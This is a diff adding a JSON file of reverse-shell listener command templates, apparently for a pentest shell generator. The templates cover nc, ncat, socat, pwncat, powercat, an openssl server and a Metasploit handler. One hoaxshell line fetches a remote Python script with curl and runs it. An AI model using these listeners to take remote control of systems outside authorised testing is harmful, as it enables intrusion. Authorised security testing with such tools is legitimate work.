@@ -1,0 +1,19 @@
+{
+  "nc": "nc -lvnp {port}",
+  "nc_freebsd": "nc -lvn {port}",
+  "busybox_nc": "busybox nc -lp {port}",
+  "ncat": "ncat -lvnp {port}",
+  "ncat_exe": "ncat.exe -lvnp {port}",
+  "ncat_tls": "ncat --ssl -lvnp {port}",
+  "rlwrap_nc": "rlwrap -cAr nc -lvnp {port}",
+  "rustcat": "rcat listen {port}",
+  "openssl": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",
+  "pwncat": "python3 -m pwncat -lp {port}",
+  "pwncat_windows": "python3 -m pwncat -m windows -lp {port}",
+  "windows_conpty": "stty raw -echo; (stty size; cat) | nc -lvnp {port}",
+  "socat": "socat -d -d TCP-LISTEN:{port} STDOUT",
+  "socat_tty": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}",
+  "powercat": "powercat -l -p {port}",
+  "msfconsole": "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\"",
+  "hoaxshell": "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t {type} -p {port}"
+}
